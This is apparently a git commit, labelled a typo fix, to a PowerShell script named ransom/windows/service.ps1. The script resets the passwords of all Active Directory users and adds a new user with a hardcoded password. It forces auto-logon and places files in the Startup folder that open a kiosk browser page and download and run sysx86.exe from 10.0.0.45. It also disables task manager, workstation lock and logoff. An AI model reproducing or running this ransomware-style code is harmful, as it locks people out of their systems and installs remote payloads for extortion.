b867c38d0f3094427bd79aacbed223c9f78f0349
6903-EthicalHacker <44905220+6903-EthicalHacker@users.noreply.github.com>
2018-11-29 01:13:45 -0800

    Fixing typo

--- ransom/windows/service.ps1
+++ ransom/windows/service.ps1
@@ -8,11 +8,11 @@ Get-ADUser -filter * | Set-ADAccountPassword -Reset -NewPassword(ConvertTo-Secur
 New-ADUser $DefaultUsername -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -asPlainText -Force) -Enabled $True
 $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
-Set-ItemProperty $RegPath "DomainUsername" -Value "$DefaultUsername" -type String 
+Set-ItemProperty $RegPath "DomainUsername" -Value "$DomainUser" -type String 
 Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
 ntrights.exe +r "SeInteractiveLogonRight" -u $DomainUser
 New-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' -Name smbsvcs.bat -Value """C:\Program Files\Internet Explorer\iexplore.exe"" -k ""http://10.0.0.45"""
-iwr 10.0.0.45/sysx86.exe 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sysx86.exe'
+wget 10.0.0.45:443/sysx86.exe -O 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sysx86.exe'
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DisableLockWorkstation" -Value 1
 New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "DisableTaskMgr" -Value 1
 New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "NoLogoff" -Value 1
